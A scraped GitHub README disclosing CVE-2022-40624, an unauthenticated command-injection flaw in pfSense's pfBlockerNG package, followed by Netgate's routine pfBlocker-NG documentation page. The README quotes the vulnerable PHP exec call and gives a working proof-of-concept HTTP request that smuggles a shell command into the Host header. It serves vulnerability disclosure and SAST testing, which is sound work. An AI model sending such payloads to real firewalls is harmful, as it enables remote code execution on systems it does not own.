=== Content from github.com_dc3328d4_20250114_204443.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdhammon%2FpfBlockerNg-CVE-2022-40624)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdhammon%2FpfBlockerNg-CVE-2022-40624)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=dhammon%2FpfBlockerNg-CVE-2022-40624)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dhammon](/dhammon)
/
**[pfBlockerNg-CVE-2022-40624](/dhammon/pfBlockerNg-CVE-2022-40624)**
Public

* [Notifications](/login?return_to=%2Fdhammon%2FpfBlockerNg-CVE-2022-40624) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fdhammon%2FpfBlockerNg-CVE-2022-40624)
* [Star
   1](/login?return_to=%2Fdhammon%2FpfBlockerNg-CVE-2022-40624)

[1
star](/dhammon/pfBlockerNg-CVE-2022-40624/stargazers) [0
forks](/dhammon/pfBlockerNg-CVE-2022-40624/forks) [Branches](/dhammon/pfBlockerNg-CVE-2022-40624/branches) [Tags](/dhammon/pfBlockerNg-CVE-2022-40624/tags) [Activity](/dhammon/pfBlockerNg-CVE-2022-40624/activity)
 [Star](/login?return_to=%2Fdhammon%2FpfBlockerNg-CVE-2022-40624)

 [Notifications](/login?return_to=%2Fdhammon%2FpfBlockerNg-CVE-2022-40624) You must be signed in to change notification settings

* [Code](/dhammon/pfBlockerNg-CVE-2022-40624)
* [Issues
  0](/dhammon/pfBlockerNg-CVE-2022-40624/issues)
* [Pull requests
  0](/dhammon/pfBlockerNg-CVE-2022-40624/pulls)
* [Actions](/dhammon/pfBlockerNg-CVE-2022-40624/actions)
* [Projects
  0](/dhammon/pfBlockerNg-CVE-2022-40624/projects)
* [Security](/dhammon/pfBlockerNg-CVE-2022-40624/security)
* [Insights](/dhammon/pfBlockerNg-CVE-2022-40624/pulse)

Additional navigation options

* [Code](/dhammon/pfBlockerNg-CVE-2022-40624)
* [Issues](/dhammon/pfBlockerNg-CVE-2022-40624/issues)
* [Pull requests](/dhammon/pfBlockerNg-CVE-2022-40624/pulls)
* [Actions](/dhammon/pfBlockerNg-CVE-2022-40624/actions)
* [Projects](/dhammon/pfBlockerNg-CVE-2022-40624/projects)
* [Security](/dhammon/pfBlockerNg-CVE-2022-40624/security)
* [Insights](/dhammon/pfBlockerNg-CVE-2022-40624/pulse)

# dhammon/pfBlockerNg-CVE-2022-40624

    main[Branches](/dhammon/pfBlockerNg-CVE-2022-40624/branches)[Tags](/dhammon/pfBlockerNg-CVE-2022-40624/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/dhammon/pfBlockerNg-CVE-2022-40624/commits/main/) | | |
| [.gitignore](/dhammon/pfBlockerNg-CVE-2022-40624/blob/main/.gitignore ".gitignore") | | [.gitignore](/dhammon/pfBlockerNg-CVE-2022-40624/blob/main/.gitignore ".gitignore") |  |  |
| [README.md](/dhammon/pfBlockerNg-CVE-2022-40624/blob/main/README.md "README.md") | | [README.md](/dhammon/pfBlockerNg-CVE-2022-40624/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# pfBlockerNg-CVE-2022-40624

# Background

pfBlockerNG is the Next Generation of pfBlocker with the following features:

1. Manage IPv4/v6 List Sources into 'Deny, Permit or Match' formats.
2. GeoIP database by MaxMind Inc. (GeoLite2 Free version).
3. De-Duplication, Suppression, and Reputation enhancements.
4. Provision to download from diverse List formats.
5. Advanced Integration for Proofpoint ET IQRisk IP Reputation Threat Sources.
6. Domain Name (DNSBL) blocking via Unbound DNS Resolver.

<https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html>

# Affected Versions

pfBlockerNg <2.1.4\_27

# Vulnerability

Unauthenticated remote code execution (RCE)

The query for TLD Block section of `index.php` includes an unsanitized/unescaped user input `d_query` from the HEADER Host source into the PHP exec function sink.

`exec("/usr/bin/grep -l '^{$d_query}$' /var/db/pfblockerng/dnsblalias/DNSBL_TLD", $match);`

*/pfblockerng/www/index.php*

```
// Query for a TLD Block
if (empty($pfb_query)) {
	$idparts	= explode('.', $query);
	$idcnt		= (count($idparts) -1);

	for ($i=1; $i <= $idcnt; $i++) {
		$d_query = implode('.', array_slice($idparts, -$i, $i, TRUE));
		exec("/usr/bin/grep -l '^{$d_query}$' /var/db/pfblockerng/dnsblalias/DNSBL_TLD", $match);

		if (!empty($match[0])) {
			$pfb_query = 'DNSBL_TLD';
			break;
		}
	}
}

```

# Exploitation

Requires HTTP access to pfsense web console
Sample payload: `' *; sleep 5; '`

POC Request:

```
GET /pfblockerng/www/index.php HTTP/1.1
Host: test.test2' *; sleep 5; '
Content-Length: 2

```

# Inspiration

I love pfBlockerNg and was inspired by Di r00t's recent CVE-2022-31814 and great writeup <https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/> and was curious to see if Snyk static application security test (SAST) tool would detect the vulnerability. So I download the respecitive index.php version 2.1.4\_26 file and ran Snyk Code against it. Sure enough Snyk detected the vuln plus another similar reporting just a handful of lines later.

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/dhammon/pfBlockerNg-CVE-2022-40624/activity)
### Stars

[**1**
star](/dhammon/pfBlockerNg-CVE-2022-40624/stargazers)
### Watchers

[**2**
watching](/dhammon/pfBlockerNg-CVE-2022-40624/watchers)
### Forks

[**0**
forks](/dhammon/pfBlockerNg-CVE-2022-40624/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fdhammon%2FpfBlockerNg-CVE-2022-40624&report=dhammon+%28user%29)

## [Releases](/dhammon/pfBlockerNg-CVE-2022-40624/releases)

No releases published

## [Packages 0](/users/dhammon/packages?repo_name=pfBlockerNg-CVE-2022-40624)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from docs.netgate.com_7a1e01fc_20250114_204441.html ===


[Netgate Logo

Netgate Docs](https://docs.netgate.com)

* [Appliances](https://www.netgate.com/appliances)
* [Platforms](https://www.netgate.com/tnsr-vs-pfsense-software)
* [Support](https://www.netgate.com/support)
* [Training](https://www.netgate.com/training)

latest

* [Preface](../preface/index.html)
* [Introduction](../general/index.html)
* [Releases](../releases/index.html)
* [Product Manuals](../product-manuals.html)
* [Networking Concepts](../network/index.html)
* [IPv6](../network/ipv6/index.html)
* [Hardware](../hardware/index.html)
* [Installing and Upgrading](../install/index.html)
* [Configuration](../config/index.html)
* [Multi-Instance Management](../mim/index.html)
* [Backup and Recovery](../backup/index.html)
* [Interface Types and Configuration](../interfaces/index.html)
* [User Management and Authentication](../usermanager/index.html)
* [Certificate Management](../certificates/index.html)
* [Firewall](../firewall/index.html)
* [Network Address Translation](../nat/index.html)
* [Routing](../routing/index.html)
* [Bridging](../bridges/index.html)
* [Virtual LANs (VLANs)](../vlan/index.html)
* [Multiple WAN Connections](../multiwan/index.html)
* [Virtual Private Networks](../vpn/index.html)
* [IPsec](../vpn/ipsec/index.html)
* [L2TP VPN](../vpn/l2tp/index.html)
* [OpenVPN](../vpn/openvpn/index.html)
* [WireGuard](../vpn/wireguard/index.html)
* [Services](../services/index.html)
* [DHCP](../services/dhcp/index.html)
* [DNS](../services/dns/index.html)
* [Dynamic DNS](../services/dyndns/index.html)
* [NTPD](../services/ntpd/index.html)
* [Traffic Shaper](../trafficshaper/index.html)
* [Captive Portal](../captiveportal/index.html)
* [High Availability](../highavailability/index.html)
* [System Monitoring](../monitoring/index.html)
* [Monitoring Graphs](../monitoring/graphs/index.html)
* [System Logs](../monitoring/logs/index.html)
* [Diagnostics](../diagnostics/index.html)
* [Packages](index.html)
  + [Package Manager](manager.html)
  + [Package List](list.html)
  + [ACME package](acme/index.html)
  + [Arping Package](arping.html)
  + [Avahi package](avahi.html)
  + [AWS VPC Wizard](aws-vpc-wizard/index.html)
  + [Backup Files and Directories with the Backup Package](backup.html)
  + [Cache / Proxy](cache-proxy/index.html)
  + [FreeRADIUS package](freeradius.html)
  + [FRR Package](frr/index.html)
  + [HAProxy package](haproxy.html)
  + [iperf package](iperf.html)
  + [IPsec Export Package](ipsec-export.html)
  + [Using LLDP on pfSense software](lldp.html)
  + [Netgate Firmware Upgrade Package](netgate-firmware.html)
  + [Nmap package](nmap.html)
  + [Nut package](nut.html)
  + [Open VM Tools package](open-vm-tools.html)
  + [OpenVPN Client Export Package](openvpn-client-export.html)
  + [OpenVPN Client Import Package](openvpn-client-import.html)
  + pfBlocker-NG Package
    - [General Setup](#general-setup)
    - [Setting up Lists](#setting-up-lists)
    - [Available lists](#available-lists)
    - [FAQ](#faq)
  + [Siproxd package](siproxd.html)
  + [IDS / IPS](snort/index.html)
  + [Stunnel package](stunnel.html)
  + [Sudo Package](sudo.html)
  + [Status Traffic Totals](traffic-totals.html)
  + [UDP Broadcast Relay](udpbroadcastrelay.html)
  + [WireGuard](../vpn/wireguard/index.html)
* [Virtualization](../virtualization/index.html)
* [Wireless](../wireless/index.html)
* [Cellular Wireless](../cellular/index.html)
* [Troubleshooting](../troubleshooting/index.html)
* [pfSenseÂ® software Configuration Recipes](../recipes/index.html)

References

* [Menu Guide](../menuguide/index.html)
* [Glossary of Terms](../glossary.html)
* [Development](../development/index.html)
* [References](../references/index.html)
* [Licensing](../licensing/index.html)

Recipes

* [pfSenseÂ® software Configuration Recipes](../recipes/index.html)

[The pfSense Documentation](../index.html)

* [Docs](/) »
* [pfSenseÂ® software](/pfsense/en/latest) »
* [Packages](index.html)
* [Give Feedback](https://redmine.pfsense.org/projects/pfsense-docs/issues/new?issue[description]=*Page:*%20https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html%0A%0A*Feedback:*&issue[subject]=Feedback%20on%20Packages%20%E2%80%94%20pfBlocker-NG Package)

---

Next

[Siproxd package](siproxd.html "Siproxd package")

Previous

[OpenVPN Client Import Package](openvpn-client-import.html "OpenVPN Client Import Package")

---

#### On This Page

* pfBlocker-NG Package
  + [General Setup](#general-setup)
  + [Setting up Lists](#setting-up-lists)
  + [Available lists](#available-lists)
  + [FAQ](#faq)

# pfBlocker-NG Package[Â¶](#pfblocker-ng-package "Link to this heading")

**pfBlocker-NG** introduces an enhanced alias table feature to pfSenseÂ®
software.

This package enables users to:

* Assign many IP address URL lists from sites like I-blocklist to a single alias
  and then choose a rule action.
* Block countries and IP address ranges.
* Use native functions of pfSense software instead of file hacks and table
  manipulation.

Features include:

* Geographical/Country Blocking
* IP block lists
* Dashboard widget
* XMLRPC Sync
* Frequently updated lists
* Many options to control what to block and how to block
* Network lists can be used in custom rules

## General Setup[Â¶](#general-setup "Link to this heading")

Set the interfaces to be monitored by pfBlocker-NG (both inbound and outbound),
where the inbound is the Internet connection.

To prevent devices or users from accessing sites in the selected countries/IP
addresses, select local interfaces under **outbound**.

## Setting up Lists[Â¶](#setting-up-lists "Link to this heading")

This is the IPBlocklist feature, enter IP addresses here to specifically block.
It must be in the file format or CIDR. Create a list for each type of action to
be taken by pfBlocker.

Options are:

Deny Both

Will deny access on Both directions.

Deny Inbound

Will deny access from selected lists to the local network.

Deny Outbound

Will deny access from local users to IP address lists selected to block.

Permit Inbound

Will allow access from selected lists to the local network.

Permit Outbound

Will allow access from local users to IP address lists selected to block.

Disabled

Will just keep selection and do nothing to selected Lists.

Alias Only

Will create an alias with selected Lists to help custom rule assignments.

The rest of the tabs (except sync) specify the other lists included with
the package. They are separated by continent with the exception of the
spammer list which contains countries from around the globe that are
known to harbor spammers.

Sync tab configures pfBlocker to sync its configuration to other pfSense
devices.

## Available lists[Â¶](#available-lists "Link to this heading")

Spamhaus

DROP and EDROP.

* <http://www.spamhaus.org/drop/drop.txt>
* <http://www.spamhaus.org/drop/edrop.txt>

DShield

Most Active Attacking IPs.

* <http://feeds.dshield.org/top10-2.txt>

iblocklist.com

A number of lists are available.

* <http://www.iblocklist.com/lists.php>

## FAQ[Â¶](#faq "Link to this heading")

Iâm getting memory errors while applying pfblocker lists, how to fix this?:

Increase table size to avoid memory errors in Advanced settings.

I canât see any pfblocker rules applied, whats wrong?:

pfblocker requires at least one firewall entry (any interface) for it to be
active. One way to verify is to check the front page widget.

pfBlocker always moves its rules to the top, how can I stop this?:

Change rule action to Alias only and then apply custom rules using pfBlocker
aliases with an arbitrary sequence.

How can I apply pfBlocker lists in floating rules?:

Aliases are used for customized filter entries and float rules.

See also

The [pfSense software issue tracker](https://redmine.pfsense.org/projects/pfsense-packages/issues?utf8=%E2%9C%93&set_filter=1&sort=id%3Adesc&f%5B%5D=status_id&op%5Bstatus_id%5D=o&f%5B%5D=category_id&op%5Bcategory_id%5D=%3D&v%5Bcategory_id%5D%5B%5D=97&f%5B%5D=&c%5B%5D=tracker&c%5B%5D=status&c%5B%5D=priority&c%5B%5D=subject&c%5B%5D=assigned_to&c%5B%5D=updated_on&group_by=&t%5B%5D=) contains a list of known issues with
this package.

---

Next

[Siproxd package](siproxd.html "Siproxd package")

Previous

[OpenVPN Client Import Package](openvpn-client-import.html "OpenVPN Client Import Package")

Was this page helpful?

Documentation Feedback

For assistance in solving software problems, please post your question on the [Netgate Forum](https://forum.netgate.com).
If you see anything that's wrong or missing with the documentation, please suggest an edit by using the feedback
button in the upper right corner so it can be improved.

---

 Additional Resources
v: latest

Languages
[en](/pfsense/en/latest/)

Versions
[latest](/pfsense/en/latest/)

---


